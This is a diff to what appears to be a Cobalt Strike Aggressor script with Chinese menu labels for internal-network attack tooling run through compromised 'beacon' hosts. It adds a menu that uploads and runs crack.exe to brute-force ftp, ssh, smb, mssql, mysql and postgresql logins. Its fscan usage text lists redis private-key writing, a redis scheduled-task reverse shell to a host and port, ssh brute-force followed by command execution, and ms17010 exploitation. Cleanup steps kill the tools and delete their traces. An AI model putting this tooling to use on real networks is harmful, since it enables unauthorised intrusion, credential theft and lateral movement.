@@ -1,6 +1,6 @@
-menu "内网扫描" {
-  menu "Fscan" {
-    item "上传fscan" {
+menu "☆ 内网扫描" {
+  menu "Fscan (内网大保健)" {
+    item "上传 Fscan" {
       $bid = $1;
       $dialog = dialog("上传fscan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &fscan);
       dialog_description($dialog, "支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。项目地址：https://github.com/shadow1ng/fscan");
@@ -10,10 +10,30 @@ menu "内网扫描" {
     }
     sub fscan {
       bcd($bid, $3['UploadPath']);
-      bupload($bid, script_resource("/scripts/IntrScan/fscan.exe"));
+      if (-is64 $bid['id']) {
+        bupload($bid, script_resource("/scripts/IntrScan/fscan/x64/fscan.exe"));
+      }else{
+        bupload($bid, script_resource("/scripts/IntrScan/fscan/x86/fscan.exe"));
+      }      
     }
-    item "运行fscan"{
+    item "运行 Fscan"{
       $bid = $1['@'];
+      btask($bid, "-------------------------------------------------------Fscan 使用方法------------------------------------------------------------", "");
+      btask($bid, "fscan.exe", "");      
+      btask($bid, "fscan.exe -h 192.168.1.1/24                      (默认使用全部模块)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub       (redis 写私钥)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami            (ssh 爆破成功后，命令执行)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222       (指定模块ssh和端口)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010           (指定模块)", "");
+      btask($bid, " ", "");
+      btask($bid, "-h 192.168.1.1/24 (C段)", "");
+      btask($bid, "-h 192.168.1.1/16 (B段)", "");
+      btask($bid, "-h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)", "");
+      btask($bid, "-hf ip.txt        (以文件导入)", "");
+      btask($bid, " ", "");
+      btask($bid, "fscan.exe -h      (查看完整使用方法)", "");
+      btask($bid, " ", "");      
       $dialog = dialog("运行fscan",%(exec => "fscan.exe -h 192.168.1.1/24 -o out.txt", bid => $bid),&fscan_run);
       dialog_description($dialog, "请在下方输入运行指令：");
       drow_text($dialog, "exec", "Exec: ");
@@ -24,11 +44,71 @@ menu "内网扫描" {
       $exec = $3['exec'];
       brun($bid, "$exec");
     }
-    item "删除fscan"{
+    item "删除 Fscan"{
       $bid = $1['@'];
       bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe & del /f /s /q out.txt");
     }
   }
+
+  menu "Crack (内网爆破)" {
+    item "上传 Crack" {
+        $bid = $1;
+        $dialog = dialog("上传crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
+        dialog_description($Dialog, "支持爆破ftp，ssh，smb，mssql，mysql, postgresql,爆破完毕会在当前目录生成result.txt。fork地址：https://github.com/oksbsb/crack");
+        drow_text($dialog, "UploadPath",  "上传路径: ");
+        dbutton_action($dialog, "上传");
+        dialog_show($dialog);
+    }
+      sub crack {
+        bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/scripts/IntrScan/crack.exe"));
+      }
+    item "运行 Crack"{
+        $bid = $1['@'];
+        btask($bid, "--------------------------------------------------------Crack 使用方法------------------------------------------------------------", "");
+        btask($bid, "crack.exe", "");
+        btask($bid, "-i string", "");
+        btask($bid, "   ip addr 192.168.1.1/24，192.168.1-255，192.168.1.1", "");
+        btask($bid, "-p string", "");
+        btask($bid, "   port 21,22，445，3306，1433", "");
+        btask($bid, "-U string", "");
+        btask($bid, "   filename list or username", "");
+        btask($bid, "-P string", "");
+        btask($bid, "   filename list or username", "");
+        btask($bid, "-s string", "");
+        btask($bid, "   service ftp  ssh，smb，mssql，mysql, postgresql   default  only scan tcp port (default \"scan\")", "");
+        btask($bid, "-t int", "");
+        btask($bid, "   thread (default 100)", "");
+        btask($bid, " ", "");        
+        $Dialog = dialog("运行crack",%(ip => "192.168.1.1/24", port => "445", username => "filename list or username", password => "filename list or password", type => "smb", thread => "100",bid => $bid),&crack_run);
+        dialog_description($Dialog, "支持爆破ftp，ssh，smb，mssql，mysql, postgresql,爆破完毕会在当前目录生成result.txt。");
+        drow_text($Dialog, "ip", "ip: ");
+        drow_text($Dialog, "port", "port: ");
+        drow_text($Dialog, "username", "username: ");
+        drow_text($Dialog, "password", "password: ");
+        drow_text($Dialog, "type", "type: ");
+        drow_text($Dialog, "thread", "thread: ");
+        dbutton_action($Dialog, "运行");
+        dialog_show($Dialog);
+    }
+    sub crack_run{
+        local('$Name $port $username $password $type $thread');
+        $Name = $3['ip'];
+        $port = replace($3['port'], "\"", "");
+        $username = $3['username'];
+        $password = $3['password'];
+        $type = $3['type'];
+        $thread = $3['thread'];
+        bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
+    }
+    item "删除 Crack"{
+        local('$bid');
+        foreach $bid ($1){
+          bshell($1, "taskkill -f /im crack.exe & del /f /s /q crack.exe");
+        }
+    }
+  }
+
   item "SharpWebScan (探测web服务)" {
     $bid = $1['@'];
     $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
@@ -55,11 +135,16 @@ menu "内网扫描" {
     }
     sub TailorScan {
       bcd($bid, $3['UploadPath']);
-      bupload($bid, script_resource("/scripts/IntrScan/TailorScan.exe"));
+      if (-is64 $bid['id']) {
+        bupload($bid, script_resource("/scripts/IntrScan/TailorScan/x64/TailorScan.exe"));
+      }else{
+        bupload($bid, script_resource("/scripts/IntrScan/TailorScan/x86/TailorScan.exe"));
+      }      
     }
     item "运行TailorScan"{
 			$bid = $1['@'];
       btask($bid, " ", "");
+      btask($bid, "----------------------------------------------------TailorScan 使用方法------------------------------------------------------------", "");
       btask($bid, "TailorScan.exe", "");
       btask($bid, " ", "");
       btask($bid, "扫描IP格式支持：", "");
